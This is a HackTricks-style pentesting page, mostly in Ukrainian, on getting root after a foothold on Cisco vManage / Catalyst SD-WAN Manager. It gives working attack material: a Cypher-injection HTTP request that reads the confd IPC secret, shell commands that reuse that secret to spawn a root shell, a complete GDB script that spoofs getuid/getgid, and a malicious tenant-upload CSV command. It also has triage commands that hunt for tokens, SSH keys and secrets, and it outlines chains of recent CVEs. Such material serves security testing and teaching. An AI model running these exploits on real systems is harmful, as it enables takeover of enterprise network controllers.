# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Після того, як ви отримали code execution на Cisco vManage / *Catalyst SD-WAN Manager* як `vmanage`, `netadmin` або `vmanage-admin`, найцікавіші локальні privesc-цілі зазвичай — це `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs та root-owned import/upload handlers.

Якщо вам ще потрібен **initial foothold** на controller, спочатку перевірте окрему сторінку control-plane:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Quick local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Якщо `/etc/confd/confd_ipc_secret` readable з вашого foothold, Path 1 і Path 2 стають одразу практичними. Якщо ви потрапили через remote info leak або webshell, також перевірте, чи вже можете дістатися до `vmanage-admin` SSH material або multitenancy upload handlers: дослідження 2026 року показало, що обидва були реалістичними stepping stones.

## Path 1

(Example from [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))

After digging a little through some [documentation](http://66.218.245.39/doc/html/rn03re18.html) related to `confd` and the different binaries (accessible with an account on the Cisco website), we found that to authenticate the IPC socket, it uses a secret located in `/etc/confd/confd_ipc_secret`:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Пам’ятаєш наш Neo4j instance? Він працює з привілеями користувача `vmanage`, що дає нам змогу отримати файл, використавши попередню vulnerability:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
Програма `confd_cli` не підтримує аргументи командного рядка, але викликає `/usr/bin/confd_cli_user` з аргументами. Тож ми можемо напряму викликати `/usr/bin/confd_cli_user` з власним набором аргументів. Однак він нечитабельний з нашими поточними привілеями, тому нам доведеться дістати його з rootfs і скопіювати за допомогою scp, прочитати help і використати його, щоб отримати shell:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Шлях 2

(Приклад із [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

Блог¹ від команди synacktiv описував елегантний спосіб отримати root shell, але нюанс у тому, що він вимагає отримати копію `/usr/bin/confd_cli_user`, яка читається лише root. Я знайшов інший спосіб підвищити привілеї до root без такого клопоту.

Коли я дизасемблював бінарний файл `/usr/bin/confd_cli`, я помітив таке:

<details>
<summary>Objdump showing UID/GID collection</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Коли я запускаю “ps aux”, я спостерігав таке (_note -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Я припустив, що програма “confd_cli” передає user ID і group ID, які вона отримала від logged in user, до застосунку “cmdptywrapper”.

Моя перша спроба полягала в тому, щоб запустити “cmdptywrapper” напряму і передати йому `-g 0 -u 0`, але це не спрацювало. Схоже, десь по дорозі був створений file descriptor (-i 1015), і я не можу його підробити.

Як згадано в synacktiv’s blog(last example), програма “confd_cli” не підтримує command line argument, але я можу впливати на неї за допомогою debugger, і на щастя GDB є в системі.

Я створив GDB script, у якому примусив API `getuid` і `getgid` повертати 0. Оскільки через deserialization RCE я вже маю “vmanage” privilege, у мене є дозвіл на пряме читання `/etc/confd/confd_ipc_secret`.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Вивід консолі</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Шлях 3 (помилка валідації введення CLI 2025 - CVE-2025-20122)

Пізніше Cisco задокументувала чистіший локальний шлях до root у власному advisory для [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): **автентифікований attacker лише з привілеями read-only** міг надіслати crafted request до manager CLI і перейти до root через недостатню валідацію введення.

З offensive perspective, це головний висновок:

1. Щойно у вас є *будь-який* low-priv foothold на машині, слід протестувати локальний CLI service перед тим, як іти за важчим workflow Path 1 / Path 2.
2. Повторно використайте artifacts з Path 2, щоб знайти trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
3. Ставтеся до кожного поля, яке передається до CLI backend, як до підозрілого: UID/GID, username, terminal metadata, imported files або будь-яке значення, яке потім використовується helper’ом, що належить root.
4. Якщо low-priv user може дістатися локального CLI socket і впливати на ці поля, root може бути лише за один crafted request.

Практичний workflow після отримання доступу до appliance такий:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Це перетворює bug 2025 на хороший hunting pattern для схожих версій: шукайте **local CLI shims that collect identity in userland and forward it to a more privileged wrapper**.

Не плутайте **CVE-2025-20122** з пізнішим **CVE-2026-20122**: проблема 2025 року — це *local* CLI-to-root bug, тоді як проблема 2026 року — це *remote* API arbitrary file overwrite, яка здебільшого корисна для закріплення foothold, а потім повторного проходу через Path 1 / Path 2 / Path 4.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco's February 2026 advisory also introduced another useful privesc class: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) allowed an **authenticated, local attacker with low privileges** to gain root because of an insufficient user-authentication mechanism in the REST API.

This matters because vManage privesc is not limited to `confd`/TTY abuse anymore. After a low-priv shell, also hunt for:

- localhost-only API endpoints that trust the caller too much
- tokens, cookies, or service credentials readable from the current account
- root-only actions exposed through `dataservice`/REST handlers that can still be triggered locally

In practice, once you have a shell as `vmanage` or another service user, local API abuse is often quieter and easier to automate than interactive CLI abuse:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
If the local session context is enough to hit privileged REST functionality, prefer the API path: it is easier to replay, script, and chain with stolen web sessions or API tokens.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Another recent pattern is [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): a local attacker with `netadmin` privileges could upload a **crafted file** that the CLI later handled unsafely, leading to command injection as `root`.

From a HackTricks point of view, the valuable technique is broader than the specific CVE:

1. Enumerate every CLI or web workflow that accepts a file: imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
2. Trace where the uploaded file lands and which root-owned script or binary consumes it.
3. Test whether the filename, file content, or parsed metadata is ever passed to shell commands, wrapper scripts, or `system()`-style helpers.
4. If you can already reach `netadmin` (valid creds, stolen session, or an auth-bypass chain), file-processing bugs are often the fastest path to root.

Google Cloud / Mandiant later showed a very concrete instance of this bug class being exploited through the multitenancy import path:
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
У спостережуваній атаці створений CSV зрештою змінював `/etc/passwd` і `/etc/shadow`, щоб створити тимчасовий акаунт UID 0 (`troot`). Це робить `tenant-upload` / `tenant-list` style importers особливо цікавими: це не просто features для data-ingestion, а потенційні parser front-ends, що належать root.

Швидкий shell-side hunting pattern такий:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Цей клас багів особливо добре ланцюжиться з remote footholds, які дають `netadmin`, але не `root`.

## Інші нещодавні вразливості vManage/Catalyst SD-WAN Manager для chain

- **Unauthenticated info leak (CVE-2026-20133)** – Особливо цінна, тому що public research показав, що вона може розкрити `confd_ipc_secret` або приватний ключ `vmanage-admin`, перетворюючи read bug на Path 1 або NETCONF pivot.
- **Authenticated API arbitrary file overwrite (CVE-2026-20122)** – Відрізняється від CLI bug 2025 вище; VulnCheck використав її, щоб завантажити webshell, що робить local privesc paths на цій сторінці негайно релевантними.
- **Authenticated UI XSS (CVE-2024-20475)** – Викрасти admin session у web UI, потім pivot у API/CLI actions, які зрештою досягають `vshell` або одного з local privesc paths вище.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Дуже сильний precursor для Path 5, тому що `netadmin` — це саме той рівень, який потрібен для 2026 crafted-file privesc.
- **Authenticated arbitrary file write (CVE-2026-20262)** – Подібна offensive value до CVE-2026-20122, але через пізніший web UI upload path: запис у location, який згодом буде parsed by root або by the management-plane web tier.
- **Downgrade to resurrect old CLI privesc (CVE-2022-20775)** – 2026 intrusions показали, що attackers можуть відкотитися до старішої vulnerable SD-WAN build, abuse the old CLI root bug, а потім restore original version.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Краще задокументовано на окремій сторінці SD-WAN control-plane; воно може append SSH key для `vmanage-admin`, даючи вам local foothold, потрібний щоб повернутися до цієї сторінки.



## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [VulnCheck: Herding Cats - Recent Cisco SD-WAN Manager Vulnerabilities](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [Google Cloud / Mandiant: Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
{{#include ../../banners/hacktricks-training.md}}
